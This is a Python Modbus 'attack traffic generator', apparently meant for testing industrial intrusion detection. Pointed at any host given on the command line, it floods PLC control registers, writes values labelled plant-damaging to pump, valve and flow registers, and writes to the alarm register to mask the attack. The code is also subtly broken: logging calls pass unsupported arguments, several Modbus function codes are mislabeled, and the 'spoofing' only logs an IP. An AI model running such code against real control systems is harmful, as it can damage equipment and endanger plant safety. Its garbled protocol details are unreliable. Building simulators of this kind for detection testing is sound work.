#!/usr/bin/env python3
"""
ATTACK TRAFFIC GENERATOR - Modbus Malicious Activity Simulator

This script simulates sophisticated cyber attacks against the Modbus PLC,
representing realistic threat scenarios that industrial security systems
must defend against.

ATTACK SCENARIOS:
1. REGISTER FLOODING - Rapid, continuous writes to control registers
2. VALUE CORRUPTION - Setting registers to extreme/plant-damaging values
3. SOURCE SPOOFING - Attacking from legitimate-looking source IPs
4. FUNCTION CODE ABUSE - Using uncommon function codes maliciously
5. SAFETY SYSTEM COMPROMISE - Writing to critical safety registers
6. TIMING ANOMALIES - Attacking outside normal operating windows

Attack Goals:
- Cause system instability (pump speed 9999, valve position 999%)
- Trigger hardware damage (temperature override, pressure override)
- Disrupt production (rapid register changes)
- Gain persistence (writing to alarm register to hide attacks)
"""

import asyncio
import pymodbus
from pymodbus.client import AsyncModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import logging
import random
import json
import time
from datetime import datetime
from typing import Dict, List, Tuple
import argparse
import sys

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('attack_traffic.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('attack_traffic')

# Attack register map and patterns
ATTACK_REGISTERS = {
    "critical_control": {
        "registers": [40001, 40002, 40005],  # pump_speed, valve_position, flow_rate
        "attack_values": [9999, 999, 9999],  # Plant-damaging values
        "description": "Critical control registers - attempt system destruction"
    },
    "safety_vulnerabilities": {
        "registers": [40006],               # alarm_status  
        "attack_values": [999],             # Flood alarm register to hide attacks
        "description": "Safety registers - write to evade detection"
    },
    "sensor_spoofing": {
        "registers": [40003, 40004],       # temperature, pressure
        "attack_values": [999, 999],       # Invalid sensor readings
        "description": "Sensor register spoofing - create false alarms"
    }
}

class AttackTrafficGenerator:
    """Generates sophisticated Modbus attack traffic for security testing."""
    
    def __init__(self, host: str = '127.0.0.1', port: int = 502, 
                 source_ip: str = '192.168.1.100', attack_scenario: str = 'all'):
        self.host = host
        self.port = port
        self.source_ip = source_ip
        self.attack_scenario = attack_scenario
        self.client = None
        self.running = True
        self.log_file = open('attack_traffic.log', 'a')
        
        # Attack operation counters
        self.attack_stats = {
            "flooding_attacks": 0,
            "value_corruption": 0,
            "function_abuse": 0,
            "safety_compromise": 0,
            "total_attacks": 0
        }
        
        # Timing anomalies
        self.peak_hour_start = 14  # 2 PM
        self.peak_hour_end = 15    # 3 PM
        self.off_hours_start = 2   # 2 AM  
        self.off_hours_end = 6     # 6 AM
        
        # Source IP patterns (to appear legitimate)
        self.legitimate_source_ips = [
            '10.0.1.1', '10.0.1.2', '10.0.2.1', '10.0.2.2', 
            '192.168.100.1', '192.168.100.2', '172.16.1.1'
        ]
    
    def get_source_ip_for_attack(self):
        """Select source IP to appear legitimate."""
        if self.source_ip:
            return self.source_ip
        else:
            # Random legitimate IP to avoid easy detection
            return random.choice(self.legitimate_source_ips)
    
    def log_attack(self, attack_type: str, register: int, function_code: int, 
                   value: int, source_ip: str = None, timing_anomaly: bool = False):
        """Log attack attempts for security analysis."""
        timestamp = datetime.now().isoformat()
        if source_ip is None:
            source_ip = self.get_source_ip_for_attack()
            
        attack = {
            "timestamp": timestamp,
            "attack_type": attack_type,
            "register": register,
            "function_code": f"0x{function_code:02x}",
            "value": value,
            "source_ip": source_ip,
            "timing_anomaly": timing_anomaly,
            "legitimacy_indicator": "attack_significant"
        }
        
        log_entry = json.dumps(attack) + "\n"
        self.log_file.write(log_entry)
        self.log_file.flush()
        
        # Update attack statistics
        self.attack_stats["total_attacks"] += 1
        
        # Increment specific attack type counter
        for key in self.attack_stats:
            if attack_type.replace('_', '') in key.replace('_', ''):
                self.attack_stats[key] += 1
        
        timing_str = " (TIMING ANOMALY)" if timing_anomaly else ""
        logger.warning(f"⚠️  {attack_type.upper()} from {source_ip}: "
                      f"Reg {register} (FC 0x{function_code:02x}) = {value}{timing_str}")
    
    def is_timing_anomaly(self) -> bool:
        """Check if current time represents a timing anomaly."""
        current_hour = datetime.now().hour
        
        # Peak hours for industrial operations (avoid detection)
        in_peak_hours = self.peak_hour_start <= current_hour <= self.peak_hour_end
        
        # Off-hours for maintenance/baseline operations
        in_off_hours = self.off_hours_start <= current_hour <= self.off_hours_end
        
        # Attacking during peak hours is normal, off-hours is anomaly
        return not in_peak_hours and in_off_hours
    
    def get_attack_function_code(self) -> int:
        """Select function code based on attack type."""
        current_time = time.time()
        
        # Function code 0x06 (Write Single Register) - most common
        if current_time % 3 < 1:
            return 0x06
        # Function code 0x10 (Write Multiple Registers) - sophisticated attacks
        elif current_time % 3 < 2:
            return 0x10
        # Function code 0x17 (Report Slave ID) - uncommon for PLCs
        else:
            return 0x17
    
    async def connect(self) -> bool:
        """Connect to Modbus server."""
        try:
            self.client = AsyncModbusTcpClient(
                host=self.host,
                port=self.port,
                framer=pymodbus.framer.SOCKET,
                timeout=3
            )
            await self.client.connect()
            logger.info(f"Attack client connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            logger.error(f"Attack client connection failed: {e}")
            return False
    
    async def flooding_attack(self):
        """Rapid register flooding - DoS style attack."""
        registers = [40001, 40002, 40005]
        flooding_values = [100, 100, 100]  # High values but within range
        
        for reg_idx in range(len(registers)):
            register = registers[reg_idx]
            value = flooding_values[reg_idx]
            
            try:
                function_code = self.get_attack_function_code()
                
                if function_code == 0x06:
                    response = await self.client.write_register(
                        address=register,
                        value=value,
                        slave=1
                    )
                elif function_code == 0x10:
                    response = await self.client.write_registers(
                        address=register,
                        values=[value],
                        slave=1
                    )
                elif function_code == 0x17:
                    # Use 0x17 with custom register
                    response = await self.client.read_holding_registers(
                        address=register,
                        count=1,
                        slave=1
                    )
                
                if not response.isError():
                    self.log_attack("flooding", register, function_code, value)
                else:
                    self.log_attack("flooding", register, function_code, value, 
                                   success=False, error="Modbus error")
                    
                await asyncio.sleep(0.1)  # Flood rapidly: 10 packets per second
                
            except Exception as e:
                self.log_attack("flooding", register, function_code, value, 
                               success=False, error=str(e))
    
    async def value_corruption_attack(self):
        """Corrupt register values with plant-damaging settings."""
        for reg_name, reg_info in ATTACK_REGISTERS.items():
            for reg_idx, register in enumerate(reg_info["registers"]):
                if self.attack_scenario in ['value_corruption', 'all']:
                    value = reg_info["attack_values"][reg_idx]
                    
                    try:
                        function_code = 0x06  # Write Single Register
                        
                        response = await self.client.write_register(
                            address=register,
                            value=value,
                            slave=1
                        )
                        
                        if not response.isError():
                            self.log_attack("value_corruption", register, 
                                           function_code, value)
                        else:
                            self.log_attack("value_corruption", register, 
                                           function_code, value, 
                                           success=False, error="Modbus error")
                        
                        await asyncio.sleep(random.uniform(1.0, 3.0))
                        
                    except Exception as e:
                        self.log_attack("value_corruption", register, 
                                       function_code, value, 
                                       success=False, error=str(e))
    
    async def function_abuse_attack(self):
        """Abuse uncommon function codes that should rarely be used."""
        uncommon_functions = {
            0x17: "Report Slave ID",      # Should be read-only for diagnostics
            0x08: "Mask Write Register", # Dangerous write operation
        }
        
        for reg_name, reg_info in ATTACK_REGISTERS.items():
            for reg_idx, register in enumerate(reg_info["registers"]):
                if self.attack_scenario in ['function_abuse', 'all']:
                    # Try multiple function codes
                    for function_code in uncommon_functions.keys():
                        try:
                            if function_code == 0x17:
                                # Report Slave ID uses different parameters
                                response = await self.client.read_holding_registers(
                                    address=register,
                                    count=1,
                                    slave=1
                                )
                            elif function_code == 0x08:
                                # Mask Write is more complex, simulate with simple write
                                response = await self.client.write_register(
                                    address=register,
                                    value=reg_info["attack_values"][reg_idx],
                                    slave=1
                                )
                            
                            if not response.isError():
                                self.log_attack("function_abuse", register, 
                                               function_code, 
                                               reg_info["attack_values"][reg_idx])
                            
                        except Exception as e:
                            self.log_attack("function_abuse", register, 
                                           function_code, 
                                           reg_info["attack_values"][reg_idx], 
                                           success=False, error=str(e))
                        
                        await asyncio.sleep(random.uniform(2.0, 5.0))
    
    async def safety_compromise_attack(self):
        """Compromise safety systems to evade detection."""
        # Target alarm register to hide other attacks
        safety_register = 40006
        
        if self.attack_scenario in ['safety_compromise', 'all']:
            for attempt in range(5):  # Multiple alarm writes to confuse
                try:
                    # Write alarm values (flooding alarm register)
                    alarm_value = random.randint(1, 100)  # Normal-looking alarm range
                    
                    response = await self.client.write_register(
                        address=safety_register,
                        value=alarm_value,
                        slave=1
                    )
                    
                    if not response.isError():
                        self.log_attack("safety_compromise", safety_register, 
                                       0x06, alarm_value)
                    
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
                except Exception as e:
                    self.log_attack("safety_compromise", safety_register, 
                                   0x06, alarm_value, 
                                   success=False, error=str(e))
    
    async def timing_anomaly_attack(self):
        """Attack during off-hours when monitoring is minimal."""
        timing_anomaly = self.is_timing_anomaly()
        
        if timing_anomaly and self.attack_scenario in ['timing_anomaly', 'all']:
            logger.warning(f"🚨 TIMING ANOMALY DETECTED: Attacking off-hours "
                          f"(current hour: {datetime.now().hour})")
        
        for reg_name, reg_info in ATTACK_REGISTERS.items():
            for reg_idx, register in enumerate(reg_info["registers"]):
                if timing_anomaly and self.attack_scenario in ['timing_anomaly', 'all']:
                    value = reg_info["attack_values"][reg_idx]
                    
                    try:
                        response = await self.client.write_register(
                            address=register,
                            value=value,
                            slave=1
                        )
                        
                        if not response.isError():
                            self.log_attack("timing_anomaly", register, 0x06, value, 
                                           timing_anomaly=True)
                        
                        await asyncio.sleep(random.uniform(3.0, 7.0))  # Slower for off-hours
                        
                    except Exception as e:
                        self.log_attack("timing_anomaly", register, 0x06, value, 
                                       timing_anomaly=True, 
                                       success=False, error=str(e))
    
    async def run(self):
        """Main attack loop with different attack modes."""
        logger.info("Starting Attack Traffic Generator (Malicious Activity Simulator)")
        logger.info(f"Attack scenario: {self.attack_scenario}")
        logger.info(f"Source IP: {self.get_source_ip_for_attack()}")
        
        if not await self.connect():
            return
        
        attack_mode = 0
        while self.running:
            try:
                # Rotate through different attack modes
                if attack_mode == 0:
                    await self.flooding_attack()
                elif attack_mode == 1:
                    await self.value_corruption_attack()
                elif attack_mode == 2:
                    await self.function_abuse_attack()
                elif attack_mode == 3:
                    await self.safety_compromise_attack()
                elif attack_mode == 4:
                    await self.timing_anomaly_attack()
                
                attack_mode = (attack_mode + 1) % 5
                
                # Wait between attack cycles
                await asyncio.sleep(random.uniform(10.0, 30.0))
                
                # Log attack statistics every 10 cycles
                if attack_mode == 0:
                    logger.info(f"Attack stats: {json.dumps(self.attack_stats, indent=2)}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.error(f"Attack cycle error: {e}")
                await asyncio.sleep(10)
        
        await self.disconnect()
    
    async def disconnect(self):
        """Disconnect from Modbus server."""
        if self.client:
            await self.client.close()
            logger.info("Attack client disconnected")
        
        if hasattr(self, 'log_file') and not self.log_file.closed:
            self.log_file.write(f"\n=== ATTACK TRAFFIC SUMMARY ===\n")
            self.log_file.write(f"Total attacks: {self.attack_stats['total_attacks']}\n")
            self.log_file.write(f"Flooding attacks: {self.attack_stats['flooding_attacks']}\n")
            self.log_file.write(f"Value corruption attacks: {self.attack_stats['value_corruption']}\n")
            self.log_file.write(f"Function abuse attacks: {self.attack_stats['function_abuse']}\n")
            self.log_file.write(f"Safety compromise attacks: {self.attack_stats['safety_compromise']}\n")
            self.log_file.close()
            
        logger.info("Attack traffic generator shutdown complete")
async def main():
    """Main entry point for attack traffic generator."""
    
    parser = argparse.ArgumentParser(description='Modbus Attack Traffic Generator')
    parser.add_argument('--host', default='127.0.0.1', help='Modbus server host')
    parser.add_argument('--port', type=int, default=502, help='Modbus server port')
    parser.add_argument('--source', help='Source IP for attacks')
    parser.add_argument('--scenario', default='all', 
                       choices=['all', 'flooding', 'value_corruption', 'function_abuse', 
                               'safety_compromise', 'timing_anomaly'],
                       help='Attack scenario to run')
    
    args = parser.parse_args()
    
    # Create and run attack generator
    attack_gen = AttackTrafficGenerator(
        host=args.host,
        port=args.port,
        source_ip=args.source,
        attack_scenario=args.scenario
    )
    
    try:
        await attack_gen.run()
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received, shutting down...")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    finally:
        if hasattr(attack_gen, 'client') and attack_gen.client:
            await attack_gen.disconnect()
if __name__ == '__main__':
    # Run the attack traffic generator
    asyncio.run(main())
